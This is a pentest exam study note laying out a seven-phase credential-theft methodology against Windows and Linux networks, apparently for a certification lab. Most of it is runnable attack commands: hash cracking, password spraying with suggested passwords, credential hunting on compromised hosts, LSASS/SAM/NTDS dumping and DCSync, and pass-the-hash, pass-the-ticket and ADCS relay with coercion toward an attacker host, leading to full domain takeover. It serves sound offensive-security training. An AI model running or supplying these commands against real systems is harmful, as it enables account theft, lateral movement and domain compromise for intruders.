# NOTE — Password Attacks Methodology (Exam Playbook)

## ID
714

## Module
Password Attacks

## Kind
methodology

## Title
Password Attacks — Full Credential-Theft Methodology

## Description
End-to-end exam-ready playbook for the Credential Theft Shuffle: identify what you have (hash / protected file / network service / shell) → offline cracking → online spray/stuff/defaults → post-foothold credential hunting → OS credential-store dumping (SAM/LSASS/CredMan/NTDS/shadow/keytab) → credential reuse & lateral movement (PtH / PtT / PtC) → domain compromise. Decision-tree first; commands drawn from this vault's own notes.

## Tags
methodology, password-attacks, exam, cheatsheet, decision-tree, hashcat, john, cracking, password-spraying, credential-hunting, sam, lsass, ntds, dcsync, pass-the-hash, pth, pass-the-ticket, ptt, pass-the-certificate, ptc, mimikatz, pypykatz, secretsdump, netexec, keytab, hashcat-modes

---

## TL;DR — The 7-Phase Flow

1. **Triage what you have** — a hash? a protected file? a reachable service? a shell? Route by artifact type.
2. **Offline cracking** — `hashid` → identify → John/Hashcat (dictionary → +rules → mask). Convert files with `*2john`.
3. **Online attacks (no shell yet)** — service brute (WinRM/SSH/RDP/SMB), password spray, credential stuffing, default creds.
4. **Post-foothold credential hunting** — files/history/configs/traffic/shares on every host you land on. **Before** you touch LSASS.
5. **OS credential-store dumping** — SAM+SYSTEM+SECURITY, LSASS, Credential Manager, NTDS.dit / Linux shadow + keytabs/ccache.
6. **Credential reuse & lateral movement** — PtH, Overpass-the-Hash, PtT (Win/Linux), PtC. Spray every new cred/hash across the subnet.
7. **Domain compromise** — NTDS dump / DCSync → loop back to Phase 4 on the next host, or report.

> **Golden rule — the Credential Theft Shuffle:** every credential is a key to the *next* door. The exam grades the *chain*, not the boxes. After **every** new cred, hash, or host: (a) re-hunt creds on it, (b) spray that cred/hash across all known hosts, *then* escalate noise. Document every cred as `proto://user:pass@host (source: where found)` as you go.

> **OPSEC / time fork:** don't burn exam hours cracking *slow* hashes (bcrypt `$2*`, yescrypt `$y$`, sha512crypt `$6$`, DCC2 `-m 2100`, BitLocker `-m 22100`, AES Kerberos). If it's an NT hash or a Kerberos ticket/cert, **pass it, don't crack it** (Phase 6). Cracking is for report impact; PtH/PtT/PtC is for getting work done. See Gotcha #1.

---

## Phase 1 — Triage: What Do You Have?

**Goal:** route to the right phase in <30 s. Match your artifact to the row.

| You have | Go to | Note |
|---|---|---|
| A raw hash string | Phase 2 (identify with `hashid` first) | `[[02-introduction-to-password-cracking]]` |
| An encrypted file (SSH key, .docx, .pdf, .zip, .kdbx, .vhd) | Phase 2 (`*2john` → crack) | `[[06-cracking-protected-files]]`, `[[07-cracking-protected-archives]]` |
| A reachable network service (5985/22/3389/445), no creds | Phase 3 (online brute / spray) | `[[08-network-services]]` |
| A username list + network access | Phase 3 (spray, lockout-aware) | `[[09-spraying-stuffing-defaults]]` |
| Leaked `user:pass` pairs | Phase 3 (credential stuffing) | `[[09-spraying-stuffing-defaults]]` |
| A vendor device / app login | Phase 3 (default creds) | `[[09-spraying-stuffing-defaults]]` |
| A shell on a Linux/Windows host | Phase 4 (hunt) → Phase 5 (dump) | `[[15-credential-hunting-in-windows]]`, `[[17-credential-hunting-in-linux]]` |
| A pcap / sniffing position | Phase 4.D (traffic carving) | `[[18-credential-hunting-in-network-traffic]]` |
| Read access to SMB shares | Phase 4.E (share spider) | `[[19-credential-hunting-in-network-shares]]` |
| An **NT hash** (not cracked) | Phase 6 (PtH / OverPtH — don't crack) | `[[20-pass-the-hash]]` |
| A Kerberos `.kirbi`/`.ccache`/keytab | Phase 6 (PtT) | `[[21-pass-the-ticket-from-windows]]`, `[[22-pass-the-ticket-from-linux]]` |
| A `.pfx` cert / `AddKeyCredentialLink` edge | Phase 6 (PtC / PKINIT) | `[[23-pass-the-certificate]]` |
| DA / replication rights / code-exec on DC | Phase 7 (NTDS / DCSync) | `[[14-attacking-active-directory-and-ntds]]` |

---

## Phase 2 — Offline Cracking

**Trigger/Precondition:** you possess a hash or an encrypted file and can run John/Hashcat offline.
**Goal:** turn the hash into cleartext (or decide it's not worth cracking → Phase 6).

### 2.A — Identify the hash FIRST

```bash
hashid -j '<HASH>'                       # -j prints the JtR format string
hashcat --help | grep -i <algo_name>     # find the -m mode
# Reference: https://hashcat.net/wiki/doku.php?id=example_hashes
```

`aad3b435b51404eeaad3b435b51404ee` is the **empty LM hash** — never a target, ignore it. Context (where it came from) decides format when `hashid` is ambiguous.

### 2.B — Convert protected files to hashes (`*2john`)

```bash
locate *2john*                           # find all converters on the box
ssh2john id_rsa            > ssh.hash     # test first: ssh-keygen -yf id_rsa (prompt = encrypted)
office2john Confidential.xlsx > off.hash
pdf2john Report.pdf        > pdf.hash
zip2john secret.zip        > zip.hash
keepass2john Vault.kdbx    > kp.hash
bitlocker2john -i Backup.vhd > bl.hashes && grep 'bitlocker$0' bl.hashes > bl.hash
```

OpenSSL-wrapped archives have **no `2john`** — brute-force decryption directly:
```bash
for i in $(cat rockyou.txt); do openssl enc -aes-256-cbc -d -in GZIP.gzip -k "$i" 2>/dev/null | tar xz; done
# wrong pass = tar garbage errors (expected); a NEW file in ls = cracked.
```

### 2.C — Crack — escalate in this order

```bash
# 1. Dictionary (always first — ~80% of real-world hits)
hashcat -a 0 -m <MODE> hash.txt /usr/share/wordlists/rockyou.txt
john --format=<FMT> --wordlist=rockyou.txt hash.txt

# 2. Dictionary + rules (high yield, low cost)
hashcat -a 0 -m <MODE> hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
john --wordlist=rockyou.txt --rules hash.txt

# 3. Single-crack (LINUX shadow / passwd+GECOS only — criminally underused)
john --single unshadowed.hashes

# 4. Mask (when you know the structure: len + char classes)
hashcat -a 3 -m <MODE> hash.txt '?u?l?l?l?l?d?s'

# 5. Custom OSINT wordlist + custom rules (targeted attack)
cewl https://target.com -d 4 -m 6 --lowercase -w site.wordlist
hashcat --force base.list -r custom.rule --stdout | sort -u > mut.list
hashcat -a 0 -m <MODE> hash.txt mut.list

# Show already-cracked (no re-crack)
hashcat -m <MODE> hash.txt --show
john hash.txt --show
```

Linux shadow workflow: `unshadow /etc/passwd /etc/shadow > u.hashes` then `hashcat -m 1800 u.hashes rockyou.txt` (sha512crypt) or `john u.hashes`.

**Output checkpoint:** after this you have either cleartext (→ Phase 3 spray it / Phase 6 reuse it) OR a decision that it's too slow (→ Phase 6 pass it raw).

---

## Phase 3 — Online Attacks (No Shell Yet)

**Trigger/Precondition:** a reachable service and either creds-to-test, a user list, leaked pairs, or a vendor default to try.
**Goal:** get one valid credential / first foothold.

> **Always pull the lockout policy before spraying AD.** `net accounts /domain`, `Get-ADDefaultDomainPasswordPolicy`, `nxc smb <dc> --pass-pol`, or `rpcclient -U "" -N <dc> -c getdompwinfo`. Spray **one** password per observation window.

### 3.A — Service brute-force (`[[08-network-services]]`)

```bash
netexec winrm <ip> -u user.list -p password.list      # (Pwn3d!) = exec-capable
evil-winrm -i <ip> -u <user> -p <pass>
hydra -L user.list -P password.list ssh://<ip> -t 4   # SSH rate-limits
hydra -I -L user.list -P password.list rdp://<ip>     # -I ignores session warnings
xfreerdp /v:<ip> /u:<user> /p:<pass> /dynamic-resolution
netexec smb <ip> -u user.list -p password.list        # Hydra SMB fails on SMBv3
# SMB fallback: msf auxiliary/scanner/smb/smb_login
```

### 3.B — Password spray / stuffing / defaults (`[[09-spraying-stuffing-defaults]]`)

```bash
# Spray: one password, many users
netexec smb 10.100.38.0/24 -u users.list -p 'Welcome1' | grep '[+]'
kerbrute passwordspray -d <domain> --dc <dc-ip> users.txt 'Spring2024!'   # quieter
# Stuffing: leaked user:pass pairs
hydra -C user_pass.list ssh://<ip>
# Defaults
pip3 install defaultcreds-cheat-sheet && creds search <vendor>
```

Top spray candidates: `Welcome1`, `Password123`, `ChangeMe123!`, `<Season><Year>!` (`Spring2024!`), `<Company>123`.

### 3.C — Build the user list when you have none

```bash
./username-anarchy First Last > users.txt          # or -i names.txt
kerbrute userenum -d <domain> --dc <dc-ip> users.txt   # validate, lockout-free
nxc smb <dc> --users        # if you already have any cred
```

**Output checkpoint:** one valid credential → Phase 4 (hunt on the host it unlocks) and Phase 6 (spray it everywhere).

---

## Phase 4 — Post-Foothold Credential Hunting

**Trigger/Precondition:** any shell, pcap, or share read access.
**Goal:** find plaintext creds *before* dumping LSASS — they don't trip AV and often outrank the user you have.

> **Search before you exploit.** The next privilege escalation is usually sitting in a text file.

### 4.A — Linux host (`[[17-credential-hunting-in-linux]]`)

Triage order: **bash_history → cron + scripts → world-readable configs → mimipenguin (root) → browser stores.**
```bash
tail -n50 /home/*/.bash_history /root/.bash_history 2>/dev/null   # sshpass -p, mysql -p, curl -u
grep -riE 'pass|cred|secret|token' /home/ /etc/ /var/www/ 2>/dev/null | grep -v '#'
cat /etc/crontab; ls -la /etc/cron.*/; crontab -l                # cron scripts → hardcoded creds/keytabs
find / -name "*.cnf" -o -name "*.conf" -o -name "*.config" 2>/dev/null | grep -v 'lib\|share'
sudo python3 mimipenguin.py                                       # root: cleartext from live sessions
python3.9 firefox_decrypt.py                                      # ~/.mozilla → cleartext logins
sudo python2.7 laZagne.py all                                     # loud, comprehensive
cat /etc/security/opasswd                                         # old password history → pattern
```

### 4.B — Windows host (`[[15-credential-hunting-in-windows]]`)

```cmd
cmdkey /list                                                       :: saved creds → runas /savecred pivot
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.ps1 *.yml
dir /s /b C:\ | findstr /i "passw cred login unattend"
```
```powershell
Get-ChildItem C:\ -Recurse -Include *.config,*.ps1,*.xml,*.txt -EA SilentlyContinue | Select-String "password","secret"
```
High-yield: `C:\unattend.xml`, `C:\Windows\Panther\Unattend.xml`, `\\<dc>\SYSVOL\` (GPP `cpassword` in Groups.xml), `\\<dc>\NETLOGON\`, `web.config`, KeePass `.kdbx`, WinSCP/mRemoteNG/RDCMan configs, AD object **description** fields. `lazagne.exe all` = nuclear option (AV-loud).

### 4.C — Saved-credential pivot (free, no cracking)

```cmd
cmdkey /list                                  :: shows Domain:interactive=SRV01\mcharles
runas /savecred /user:SRV01\mcharles cmd      :: new shell AS that user; re-run cmdkey /list inside
```

### 4.D — Network traffic (`[[18-credential-hunting-in-network-traffic]]`)

```bash
./Pcredz -f capture.pcapng -t -v        # auto-carve creds + NTLMv1/v2 + Kerberos AS-REQ
sudo ./Pcredz -i eth0 -t -v             # live
```
Wireshark: `http.request.method=="POST"` → `ftp` (USER/PASS) → `snmp` (community string) → Follow TCP Stream. Pcredz NTLMv2 → `-m 5600`; Kerberos AS-REQ → `-m 18200`.

### 4.E — SMB shares (`[[19-credential-hunting-in-network-shares]]`)

```bash
nxc smb <ip> -u <u> -p <p> --shares                                  # what can you read/write?
nxc smb <ip> -u <u> -p <p> --spider IT --content --pattern "passw"
docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider <ip> -c 'passw' -u <u> -p <p>
# From Windows: Snaffler.exe -u -s -n FILE01.domain.htb   (Red = likely cred — verify, noisy)
```
Prioritise IT / HR / Finance / Backups / Private / Admin shares. Download every `.kdbx` (`-m 13400`), `.psafe3` (`-m 5200`), `Onboarding*`/`*pass*` doc → crack offline.

**Output checkpoint:** new creds/hashes → loop to Phase 6 (spray) and Phase 5 (dump if you have admin).

---

## Phase 5 — OS Credential-Store Dumping

**Trigger/Precondition:** local admin / root / DC code-exec or DCSync rights.
**Goal:** extract every hash/ticket the host holds.

### 5.A — Windows SAM / SYSTEM / SECURITY (`[[11-attacking-sam-system-security]]`)

```cmd
reg.exe save hklm\sam C:\sam.save & reg.exe save hklm\system C:\system.save & reg.exe save hklm\security C:\security.save
```
```bash
# attacker: sudo impacket-smbserver -smb2support CompData /loot   (move *.save to it)
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
# or one-shot remote:
nxc smb <ip> --local-auth -u <u> -p <p> --sam --lsa     # --lsa often = service creds in CLEARTEXT
```
Always grab **all three** (SECURITY = DCC2 + LSA secrets + DPAPI). `-m 1000` for NT, `-m 2100` for DCC2 (slow).

### 5.B — LSASS (`[[12-attacking-lsass]]`)

```cmd
tasklist /svc | findstr lsass                          :: get PID
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full   :: AV-loud
:: stealthier: Task Manager → right-click lsass.exe → Create dump file
```
```bash
pypykatz lsa minidump lsass.dmp        # MSV=NT hash, WDIGEST=cleartext, Kerberos, DPAPI keys
```
LSASS PPL / Credential Guard may block — see Gotcha #6. WDIGEST cleartext only on legacy/forced.

### 5.C — Credential Manager / DPAPI (`[[13-attacking-windows-credential-manager]]`)

```cmd
cmdkey /list
mimikatz.exe "privilege::debug" "sekurlsa::credman" exit
lazagne.exe all
mimikatz "dpapi::chrome /in:\"%LocalAppData%\Google\Chrome\User Data\Default\Login Data\" /unprotect"
```

### 5.D — NTDS.dit (DC) (`[[14-attacking-active-directory-and-ntds]]`)

```powershell
vssadmin CREATE SHADOW /For=C:                          # note ShadowCopyN number
cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyN\Windows\NTDS\NTDS.dit C:\NTDS\NTDS.dit
reg save HKLM\SYSTEM C:\NTDS\SYSTEM
```
```bash
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL          # offline
nxc smb <dc-ip> -u <u> -p <p> -M ntdsutil                         # one-shot
impacket-secretsdump -just-dc DOMAIN/user:pass@dc.fqdn            # DCSync (replication right, no shadow)
```

### 5.E — Linux shadow / keytabs / ccache (`[[16-linux-authentication-process]]`, `[[22-pass-the-ticket-from-linux]]`)

```bash
unshadow /etc/passwd /etc/shadow > u.hashes && john u.hashes      # root only
find / -name *keytab* -ls 2>/dev/null                             # /etc/krb5.keytab = machine acct
ls -la /tmp | grep krb5cc ; env | grep -i krb5                    # ccache (mode 600)
python3 /opt/keytabextract.py file.keytab                         # NTLM (crack) + AES (OverPtH)
sudo /opt/linikatz.sh                                             # mass collect (root)
```

**Output checkpoint:** hashes/tickets/keytabs → Phase 6. Got NTDS → Phase 7.

---

## Phase 6 — Credential Reuse & Lateral Movement

**Trigger/Precondition:** you hold an NT hash, a Kerberos ticket/keytab, or a cert.
**Goal:** move laterally / escalate without ever cracking. **Spray every new hash across the subnet first.**

### 6.A — Pass-the-Hash (NTLM only — not Kerberos) (`[[20-pass-the-hash]]`)

```bash
# Spray a hash across a /24 (gold images share local admin) — find reuse FAST
netexec smb 172.16.1.0/24 -u Administrator -d . -H <NT_HASH> --local-auth | grep '(Pwn3d!)'
netexec smb <ip> -u Administrator -d . -H <NT_HASH> -x 'whoami'
impacket-psexec  <user>@<ip> -hashes :<NT_HASH>      # :hash = empty LM, just NT
impacket-wmiexec <user>@<ip> -hashes :<NT_HASH>      # stealthier
evil-winrm -i <ip> -u Administrator -H <NT_HASH>
xfreerdp /v:<ip> /u:<u> /pth:<NT_HASH>               # needs DisableRestrictedAdmin=0 on target
```
Windows-side: `mimikatz "sekurlsa::pth /user:<u> /rc4:<NT> /domain:<d> /run:cmd.exe"` or `Invoke-SMBExec`/`Invoke-WMIExec` (no local admin needed). UAC: only **RID 500** PtH's by default unless `LocalAccountTokenFilterPolicy=1`. Domain accounts are exempt.

### 6.B — Pass-the-Ticket from Windows / Overpass-the-Hash (`[[21-pass-the-ticket-from-windows]]`)

```cmd
mimikatz "privilege::debug" "sekurlsa::tickets /export" exit       :: dumps .kirbi files
Rubeus.exe dump /nowrap                                              :: base64, no disk artifact
:: Overpass-the-Hash: NT/AES key → real TGT
mimikatz "sekurlsa::ekeys"                                           :: get aes256/rc4 keys
Rubeus.exe asktgt /domain:<d> /user:<u> /aes256:<KEY> /nowrap /ptt   :: AES avoids RC4 downgrade IOC
Rubeus.exe ptt /ticket:<base64|path.kirbi>
mimikatz "kerberos::ptt ticket.kirbi"
klist                                                                :: confirm, then Enter-PSSession
```

### 6.C — Pass-the-Ticket from Linux (`[[22-pass-the-ticket-from-linux]]`)

```bash
klist -k -t carlos.keytab                                  # inspect (no auth)
kinit carlos@INLANEFREIGHT.HTB -k -t carlos.keytab         # auth as principal (case-sensitive!)
cp /tmp/krb5cc_<UID>_* /tmp/x.ccache && export KRB5CCNAME=/tmp/x.ccache
smbclient //dc01/share -k -c ls -no-pass                   # needs /etc/krb5.conf + /etc/hosts FQDN
impacket-wmiexec dc01 -k -no-pass
evil-winrm -i dc01 -r inlanefreight.htb                    # needs krb5-user pkg
impacket-ticketConverter in.ccache out.kirbi               # bridge Linux↔Windows
```

### 6.D — Pass-the-Certificate / PKINIT (`[[23-pass-the-certificate]]`)

```bash
# ESC8: relay NTLM → CA web enrollment
sudo impacket-ntlmrelayx -t http://<ca>/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
python3 printerbug.py DOMAIN/<u>:'<p>'@<dc> <attacker-ip>          # coerce (or PetitPotam/Coercer)
# Shadow Credentials: BloodHound AddKeyCredentialLink edge
pywhisker --dc-ip <dc> -d DOMAIN -u <wu> -p '<wp>' --target <victim> --action add
# Use the .pfx (both paths):
python3 gettgtpkinit.py -cert-pfx cert.pfx -pfx-pass '<pw>' -dc-ip <dc> DOMAIN/<u> /tmp/u.ccache
export KRB5CCNAME=/tmp/u.ccache
python3 getnthash.py -key <AS-REP-key> DOMAIN/<u>                  # bonus: PtC → NT hash → PtH
```

**Output checkpoint:** new session/host → loop to Phase 4 on it. DC machine ticket / DA → Phase 7.

---

## Phase 7 — Domain Compromise

**Trigger/Precondition:** local admin on DC, DA, replication rights, or a DC machine-account ticket.
**Goal:** full domain hash dump → game over (then report the chain).

```bash
# DCSync (replication right — no shadow copy needed)
impacket-secretsdump -just-dc DOMAIN/user:pass@dc.fqdn
nxc smb <dc-ip> -u <u> -H <NT_HASH> --ntds --user Administrator
# From a captured DC machine TGT (post-ESC8)
impacket-secretsdump -k -no-pass -dc-ip <dc> -just-dc-user Administrator 'DOMAIN/DC01$'@DC01.DOMAIN
# Then PtH the Administrator/krbtgt hash anywhere
evil-winrm -i <dc-ip> -u Administrator -H <NT_HASH>
```
"Uncrackable" Administrator NT hash is **still full domain access via PtH** — that's a feature, not a blocker. Cross-domain/forest escalation → `[[../ad-enum-attacks/00-METHODOLOGY]]` Phase 7.

---

## Decision Tree (Under Exam Pressure)

```
You have:
│
├── a HASH string
│   ├── hashid -j  → identify mode
│   ├── dictionary → +best64 rule → mask → custom OSINT list
│   ├── it's an NT hash → DON'T crack → Phase 6 PtH
│   └── it's slow ($2*/$y$/$6$/DCC2/BitLocker/AES) → crack only if a quick win; else Phase 6
│
├── an ENCRYPTED FILE
│   ├── ssh/office/pdf/zip/keepass → <tool>2john → john/hashcat
│   ├── .vhd → bitlocker2john -i → -m 22100 (slow) → dislocker mount
│   └── openssl-wrapped → for-loop openssl -d | tar xz
│
├── a REACHABLE SERVICE, no creds
│   ├── have user list → SPRAY (pull lockout policy FIRST) — kerbrute/nxc
│   ├── have user:pass pairs → credential stuffing (hydra -C)
│   ├── vendor device/app → creds search <vendor>; default-creds
│   └── nothing → username-anarchy + kerbrute userenum → spray Welcome1/<Season><Year>!
│
├── a SHELL on a host  (← do this BEFORE LSASS)
│   ├── Linux  → bash_history → cron/scripts → configs → mimipenguin(root) → firefox_decrypt
│   ├── Windows→ cmdkey /list → findstr password → SYSVOL/unattend → lazagne
│   ├── cmdkey shows saved cred → runas /savecred (free pivot, no crack)
│   └── then if local-admin/root → Phase 5 dump
│
├── LOCAL ADMIN / ROOT
│   ├── Win: secretsdump SAM+SECURITY+SYSTEM ; pypykatz on lsass.dmp ; --lsa = cleartext svc creds
│   ├── Lin: unshadow+john ; find keytabs ; copy ccache ; linikatz
│   └── spray every recovered hash across the /24 (nxc --local-auth -H)
│
├── an NT HASH (not cracked)
│   ├── nxc smb <subnet> --local-auth -H  → find reuse → (Pwn3d!)
│   ├── psexec/wmiexec/evil-winrm -H ; mimikatz sekurlsa::pth
│   └── RDP → needs DisableRestrictedAdmin=0 first
│
├── a KERBEROS TICKET / KEYTAB
│   ├── .kirbi/.ccache → Rubeus/mimikatz ptt (Win) ; KRB5CCNAME (Lin)
│   ├── keytab → klist -k -t ; kinit -k -t ; keytabextract → NT/AES
│   └── only NT/AES key → OverPtH: Rubeus asktgt /aes256 /ptt
│
├── a CERT / AddKeyCredentialLink edge
│   ├── ESC8: ntlmrelayx --adcs + printerbug/PetitPotam
│   ├── ShadowCred: pywhisker --action add
│   └── gettgtpkinit → KRB5CCNAME → (getnthash for free PtH)
│
├── DC ACCESS / DA / REPLICATION
│   └── secretsdump -just-dc / nxc --ntds → PtH Administrator everywhere
│
└── STUCK > 20 min
    ├── grep ../ATTACK-PATHS.md §7 for your exact state
    ├── re-hunt the LAST host (bash_history? cmdkey? cron keytab? share you skipped?)
    ├── spray every cred/hash you own across EVERY known host (you forgot one)
    └── slow hash blocking you? STOP cracking → pass it raw (PtH/PtT/PtC)
```

---

## Signal → Counter-Move Reference

| You see / observe | Likely cause | Counter-move |
|---|---|---|
| Hashcat: "No devices found" / very slow | No GPU passthrough on Pwnbox/VM | `--force` (CPU), or `john` instead; expect slow |
| `hashid` returns 5 possible formats | Ambiguous short hash | Decide by *source context*; try `-m 1000` (NT) if from Windows |
| Cracking `$2*` / `$y$` / DCC2 runs for hours | Deliberately slow KDF | **Stop** — PtH/PtT the raw value (Phase 6); cracking is report-only |
| `secretsdump` LM field = `aad3b435b51404eeaad3b435b51404ee` | LM disabled (normal) | Ignore the LM half; only the NT (field 4) matters |
| `secretsdump` cleartext file empty | No reversible-encryption accounts | Normal, not a failure — `.ntds`/SAM still has NT hashes |
| `reg save` → "Access is denied" | Not elevated | Need admin; elevate or pick another host |
| `ssh-keygen -yf id_rsa` gives no prompt | Key is **un**encrypted | Just use the key directly — nothing to crack |
| Modern OpenSSH key header looks encrypted but isn't | post-2018 header is uniform | Always test with `ssh-keygen -yf`, don't eyeball |
| `nxc` shows `[+]` but no `(Pwn3d!)` | Valid creds, not local admin there | Spray elsewhere; check other protocols/hosts |
| `rundll32 comsvcs MiniDump` flagged/blocked | EDR signature on classic dump | Use Task Manager dump, or PPLdump if LSASS is PPL |
| pypykatz shows NT but no plaintext | WDigest disabled (modern default) | Expected — PtH the NT hash; don't expect cleartext |
| `kinit` → "client not found in database" | Principal case mismatch | Lowercase user, **UPPERCASE realm**: `carlos@INLANEFREIGHT.HTB` |
| Kerberos tool fails silently / "no support for enctype" | Missing `/etc/krb5.conf` or `/etc/hosts` | Add `[libdefaults] default_realm` + KDC + FQDN host entry |
| `impacket-secretsdump -k 10.10.10.10` fails | Kerberos needs SPN hostname | Use the **FQDN**, never the raw IP, with `-k` |
| `xfreerdp /pth:` fails to log in | Restricted Admin Mode off | Set `DisableRestrictedAdmin=0` on target first |
| `runas /savecred` → "wrong password" | No saved cred for that user | `cmdkey /list` must already show it; can't conjure one |
| Hydra SMB → "invalid reply" | Old Hydra vs SMBv3 | Switch to `netexec smb` or msf `smb_login` |
| Sprayed and locked accounts | Ignored lockout policy | Always `--pass-pol` / `net accounts` first; one pass per window |
| `bitlocker2john` only reads stdin | Forgot `-i` | `bitlocker2john -i Backup.vhd`; target `$bitlocker$0/$1`, never `$2/$3` |
| Snaffler "Red" hits are junk | Classifier is noisy by design | Manually verify Red before reporting; Red = hint not proof |
| gettgtpkinit "Error detecting libcrypto" | oscrypto dependency quirk | `pip3 install -I git+https://github.com/wbond/oscrypto.git` |
| Pivoted box has no internet | DMZ no egress | Upload tools via the existing SSH/RDP session, don't pull from target |

---

## Master Cheatsheet — One-Liners by Scenario

```bash
# === S1: Identify + crack an unknown hash ===
hashid -j '<HASH>'
hashcat -a 0 -m <MODE> h.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m <MODE> h.txt --show

# === S2: Crack a protected file ===
ssh-keygen -yf id_rsa            # encrypted? then:
ssh2john id_rsa > h && john --wordlist=rockyou.txt h && john h --show

# === S3: BitLocker VHD ===
bitlocker2john -i Backup.vhd > b.h && grep 'bitlocker$0' b.h > b.hash
hashcat -a 0 -m 22100 b.hash rockyou.txt
sudo losetup -f -P Backup.vhd && sudo dislocker /dev/loop0p2 -u<pw> -- /media/bitlocker
sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount

# === S4: Online spray (lockout-aware) ===
nxc smb <dc> --pass-pol
kerbrute passwordspray -d <domain> --dc <dc-ip> users.txt 'Spring2024!'
nxc smb 10.0.0.0/24 -u users.txt -p 'Welcome1' | grep '[+]'

# === S5: Service brute + login ===
netexec winrm <ip> -u user.list -p password.list
evil-winrm -i <ip> -u <u> -p <p>
hydra -L user.list -P password.list ssh://<ip> -t 4

# === S6: Linux foothold cred hunt ===
tail -n50 /home/*/.bash_history /root/.bash_history 2>/dev/null
grep -riE 'pass|cred|secret' /home/ /etc/ /var/www/ 2>/dev/null | grep -v '#'
sudo python3 mimipenguin.py ; python3.9 firefox_decrypt.py

# === S7: Windows foothold cred hunt ===
cmdkey /list
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.ps1 *.yml
runas /savecred /user:DOMAIN\<targetuser> cmd

# === S8: Dump SAM/SECURITY/SYSTEM (remote, one-shot) ===
nxc smb <ip> --local-auth -u <u> -p <p> --sam --lsa

# === S9: Dump LSASS ===
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\l.dmp full
pypykatz lsa minidump l.dmp

# === S10: NTDS / DCSync ===
nxc smb <dc-ip> -u <u> -p <p> -M ntdsutil
impacket-secretsdump -just-dc DOMAIN/user:pass@dc.fqdn

# === S11: PtH spray across subnet → exec ===
netexec smb 172.16.1.0/24 -u Administrator -d . -H <NT_HASH> --local-auth | grep '(Pwn3d!)'
impacket-wmiexec administrator@<ip> -hashes :<NT_HASH>
evil-winrm -i <ip> -u Administrator -H <NT_HASH>

# === S12: Overpass-the-Hash (NT → TGT) ===
Rubeus.exe asktgt /domain:<d> /user:<u> /aes256:<KEY> /nowrap /ptt

# === S13: PtT from Linux (keytab/ccache) ===
kinit carlos@REALM.HTB -k -t carlos.keytab
export KRB5CCNAME=/tmp/x.ccache && smbclient //dc01/share -k -c ls -no-pass

# === S14: Pass-the-Certificate (Shadow Cred) ===
pywhisker --dc-ip <dc> -d DOMAIN -u <wu> -p '<wp>' --target <v> --action add
python3 gettgtpkinit.py -cert-pfx v.pfx -pfx-pass '<pw>' -dc-ip <dc> DOMAIN/<v> /tmp/v.ccache
export KRB5CCNAME=/tmp/v.ccache

# === S15: Skills-assessment shuffle skeleton ===
./username-anarchy First Last > u.list
hydra -L u.list -p '<knownpass>' ssh://<dmz>            # spray reuse
# ssh in → grep bash_history → pivot creds → ligolo-ng → nxc spray internal
# Snaffler → .psafe3/.kdbx → hashcat -m 5200/-m 13400 → vault creds
# spray → RDP admin → mimikatz logonpasswords → PtH hash → nxc --ntds
```

---

## Quick Reference — Tools by Function

| Function | Linux | Windows |
|---|---|---|
| Identify hash | `hashid -j`, `hashcat --help \| grep` | — |
| Offline crack | `john`, `hashcat` | `hashcat.exe` |
| File → hash | `ssh2john`/`zip2john`/`office2john`/`pdf2john`/`keepass2john`/`bitlocker2john` | same (`*2john`) |
| Custom wordlist | `cewl`, `hashcat --stdout -r`, `username-anarchy` | — |
| Service brute | `hydra`, `netexec`, `medusa`, msf `smb_login` | — |
| Spray | `kerbrute passwordspray`, `netexec` | `DomainPasswordSpray.ps1` |
| Defaults | `defaultcreds-cheat-sheet` (`creds search`) | — |
| Linux cred hunt | `grep/find`, `mimipenguin`, `firefox_decrypt`, `laZagne.py`, `linikatz.sh` | — |
| Win cred hunt | — | `cmdkey`, `findstr`, `lazagne.exe`, `Snaffler`, `PowerHuntShares` |
| Traffic carve | `Pcredz`, Wireshark/`tshark` | NetworkMiner |
| Share spider | `manspider`, `nxc --spider`, `smbclient` | `Snaffler`, `PowerHuntShares` |
| SAM/LSA dump | `impacket-secretsdump LOCAL`, `nxc --sam --lsa` | `reg save`, `mimikatz lsadump::sam` |
| LSASS dump/parse | `pypykatz lsa minidump` | `rundll32 comsvcs MiniDump`, Task Mgr, `mimikatz sekurlsa::logonpasswords` |
| Cred Manager/DPAPI | `impacket-dpapi`, DonPAPI | `cmdkey`, `mimikatz sekurlsa::credman` / `dpapi::*`, LaZagne |
| NTDS | `impacket-secretsdump -ntds/-just-dc`, `nxc -M ntdsutil` | `vssadmin`, `ntdsutil ifm` |
| Linux shadow | `unshadow` + `john`/`hashcat -m 1800` | — |
| Keytab/ccache | `klist -k -t`, `kinit -k -t`, `keytabextract`, `KRB5CCNAME` | — |
| PtH | `impacket-psexec/wmiexec`, `evil-winrm -H`, `nxc -H`, `xfreerdp /pth` | `mimikatz sekurlsa::pth`, `Invoke-TheHash` |
| PtT / OverPtH | `KRB5CCNAME`, `impacket-ticketConverter` | `mimikatz kerberos::ptt`, `Rubeus asktgt/ptt/dump` |
| PtC / PKINIT | `ntlmrelayx --adcs`, `pywhisker`, `gettgtpkinit`, `getnthash`, `printerbug` | `Certify`, `Whisker`, `Rubeus` |

**Hashcat modes to memorise:** `1000` NTLM · `1800` sha512crypt(`$6$`) · `500` md5crypt(`$1$`) · `3200` bcrypt(`$2*`) · `1400` SHA-256 · `0` MD5 · `100` SHA1 · `2100` DCC2 · `5500` NetNTLMv1 · `5600` NetNTLMv2 · `13100` Kerberoast TGS · `18200` AS-REP · `5200` Password Safe · `13400` KeePass · `22100` BitLocker · `9400/9500/9600` Office · `10400-10700` PDF · `29800` yescrypt.

---

## Top Gotchas (Things That Will Burn You)

1. **Don't crack what you can pass.** An NT hash, a TGT, a keytab, or a cert moves you laterally *as-is*. Burning exam hours on bcrypt/yescrypt/DCC2/BitLocker/AES is a trap — PtH/PtT/PtC instead. Cracking is for report impact only.
